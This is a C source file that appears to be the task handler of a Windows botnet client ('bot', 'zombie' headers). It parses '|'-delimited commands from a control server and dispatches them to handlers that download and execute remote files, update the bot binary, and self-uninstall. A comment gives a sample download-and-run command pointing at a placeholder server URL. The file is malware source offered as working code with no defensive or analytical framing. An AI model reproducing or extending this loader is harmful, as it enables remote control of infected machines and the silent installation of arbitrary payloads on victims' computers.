#include "tasks.h"

#include "../common/string.h"
#include "zombie.h"
#include "connection.h"
#include "../common/utils.h"

extern bot_t bot;

void DownloadExecute_Handler(int iTaskID, const LPSTR pszArguments)
{
	if (DownloadFile(pszArguments, TRUE))
		SendTaskSuccess(iTaskID);
}

void Update_Handler(int iTaskID, const LPSTR pszArguments)
{
	if (DownloadFile(pszArguments, TRUE))
	{
		if (CreateZombieUninstall())
		{
			SendTaskSuccess(iTaskID);
			bot.api.pExitProcess(0);
		}
	}
}

void Uninstall_Handler(int iTaskID, const LPSTR pszArguments)
{
	if (CreateZombieUninstall())
	{
		SendTaskSuccess(iTaskID);
		bot.api.pExitProcess(0);
	}
}

BOOL ExecuteTask(const LPSTR pszResponse)
{
	task_t Tasks[] =
	{
		{DOWNLOAD_EXECUTE, DownloadExecute_Handler},
		{UPDATE, Update_Handler},
		{UNINSTALL, Uninstall_Handler}
	};

	LPSTR* ppszArguments = NULL;
	int iDelimCount = -1;
	int iTaskID, iTask, i;

	iDelimCount = CharCountA(pszResponse, '|');

	if (iDelimCount < 3)
		return FALSE;

	if ((ppszArguments = SplitString(pszResponse, '|', iDelimCount)) == NULL)
		return FALSE;

	iTaskID = _ToInt32A(ppszArguments[0], FALSE);
	iTask = _ToInt32A(ppszArguments[1], FALSE);

	for (i = 0; i < sizeof(Tasks) / sizeof(task_t); i++)
	{
		if (Tasks[i].iTask == iTask)
		{
			Tasks[i].TaskProc(iTaskID, ppszArguments[2]);
			return TRUE;
		}
	}

	//1|0|http://server.com/file.exe

	return FALSE;
}